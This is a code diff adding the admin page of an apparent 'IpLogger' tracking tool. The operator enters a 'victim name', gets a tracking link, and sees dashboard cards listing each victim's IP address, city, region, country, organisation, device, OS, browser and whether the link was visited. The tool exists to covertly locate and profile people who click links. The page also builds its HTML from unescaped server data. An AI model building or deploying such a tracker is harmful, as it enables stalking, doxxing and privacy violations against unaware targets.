@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Admin</title>
+	<link rel="stylesheet" type="text/css" href="/public/css/admin.css">
+  <meta charset="utf-8" name="viewport" content="width=device-width,initial-scale=1.0">
+</head>
+<body>
+  <div class="nav">
+  	<div class="nav-brand">
+  		<img src="/public/img/log-format.png" class="logo"/>
+  		<h4>IpLogger</h4>
+  	</div>
+  	<!-- <div class="heading_container">
+  			<h3 class="heading">Admin Pannel</h3>
+  	</div> -->
+  	<div class="logout">
+  		<a href="/api/logout" >logout</a>
+  	</div>
+  </div>
+  <div class="hero">
+  	<img src="/public/img/admin.png" class="hero-img">
+  </div>
+  <div class="form">
+  	<input type="text" name="victimname" class="victimname" placeholder="Enter the victim name" required="true">
+  	<img src="/public/img/copy.png"  class="copy-img">
+  	<img src="/public/img/links.png"  class="link-img">
+  	<input type="text" name="link" class="link" placeholder="Link">
+  	
+  	<input type="button" name="getlink" class="getlink" value="Get Link" readonly="true">	
+  </div>
+  <h1 style="text-align:center; color: black;background-color: #40ff40;margin:0;">Log's</h1>
+  <div class="cards">
+  </div>
+
+</body>
+<script type="text/javascript">
+	async function getLink()
+	{
+		let victimname=document.querySelector(".victimname").value;
+		let linkbox=document.querySelector(".link");	
+		linkbox.value="Fetching.........";
+		let body=JSON.stringify({"victimname":victimname})
+		let res=await fetch("/api/link",{
+											method:"post",
+											headers:{"Content-Type":"application/json"},
+											body:body
+										}
+							);
+		res=await res.json();
+		if(res.status==="Sucess")
+		{
+			linkbox.value=window.location.origin+"/token/"+res.token;
+		}
+		else if(res.status==="Failed")
+		{
+			linkbox.value="Failed "+res.msg;
+		}
+		else if(res.status==="Try Again")
+		{
+			getLink();
+		}
+	}
+
+  	async function removeVictim(event)
+	{
+			let removeicon= event;
+			let token=removeicon.classList[1];
+			let body=JSON.stringify({"token":token});
+			let res=await fetch("/api/remove",{
+											method:"post",
+											headers:{"Content-Type":"application/json"},
+											body:body
+										});
+			res=await res.json();
+			if(res.status=="Sucess")
+			{
+				alert("Sucessfully removed");
+				removeicon.parentElement.parentElement.parentElement.remove();
+			}
+			else
+			{
+				alert("Sorry Failed to remove ",res.msg);
+			}
+
+	}
+
+	async function fetchVictim()
+	{
+		let res=await fetch("/api/get");
+		res=await res.json();
+		let cards=document.querySelector(".cards");
+		if(res.status=="Sucess")
+		{
+			if(res["victimdata"].length>0)
+			{
+				res["victimdata"].forEach((victim)=>{
+
+					console.log(victim)
+					var victimname=victim["victimname"];
+					var ip=victim["ip"]?victim["ip"]:"Not Known";
+					var city=victim["city"]?victim["city"]:"Not Known";
+					var region=victim["region"]?victim["region"]:"Not Known";
+					var country=victim["country"]?victim["country"]:"Not Known";
+					var org=victim["org"]?victim["org"]:"Not Known";
+
+					if(victim["device"])
+					{						
+						var vendor=victim["device"]["vendor"]?victim["device"]["vendor"]:"Not Known";
+						var model=victim["device"]["model"]?victim["device"]["model"]:"Not Known";
+						var type=victim["device"]["type"]?victim["device"]["type"]:"Not Known";
+					}
+					else
+					{
+						var vendor="Not Known";
+						var model="Not Known";
+						var type="Not Known";
+					}
+					var os=victim["os"]?victim["os"]:"Not Known";
+					var browser=victim["browser"]?victim["browser"]:"Not Known";
+					var isvisited=victim["isvisited"];
+
+
+					cards.innerHTML+='\
+							<div class="card">\
+							  <div class="body">\
+								  	<div class="card-img">\
+								  			<img src="public/img/victim.png" style="height:29px;">\
+								  	</div>\
+								  	<p class="victimno" style="margin:0">'+victimname+'</p>\
+									<ol class="list">\
+										<li class="list_item">Ip:<span class="value">'+ip+'</span></li>\
+										<li class="list_item">City:<span class="value">'+city+'</span></li>\
+										<li class="list_item">Region:<span class="value">'+region+'</span></li>\
+										<li class="list_item">Country:<span class="value">'+country+'</span></li>\
+										<li class="list_item">Orgnaisation:<span class="value">'+org+'</span></li>\
+										<li class="list_item">Vendor:<span class="value">'+vendor+'</span></li>\
+										<li class="list_item">Model:<span class="value">'+model+'</span></li>\
+										<li class="list_item">Type:<span class="value">'+type+'</span></li>\
+										<li class="list_item">os:<span class="value">'+os+'</span></li>\
+										<li class="list_item">browser:<span class="value">'+browser+'</span></li>\
+										<li class="list_item">Isvisited:<span class="value">'+isvisited+'</span></li>\
+									</ol>\
+									<div class="footer">\
+								  		<img src="/public/img/remove.png" class="remove-icon '+victim.token+'" onclick="removeVictim(this)">\
+								 	</div>\
+							  </div>\
+							</div>';
+				});
+
+			}		
+		}
+	}
+
+ function copyLink()
+ {
+ 	let copytext=document.querySelector(".link");
+ 	copytext.select();
+ 	copytext.setSelectionRange(0,99999);
+ 	document.execCommand("copy");
+ 	alert("copied");
+ }
+	function  main() {
+		fetchVictim();
+		var getbutton=document.querySelector(".getlink");
+		getbutton.addEventListener("click",getLink);
+		var copybutton=document.querySelector(".copy-img");
+		copybutton.addEventListener("click",copyLink);
+	}
+
+main()
+</script>
+</html>
+
+
+
+
+
+
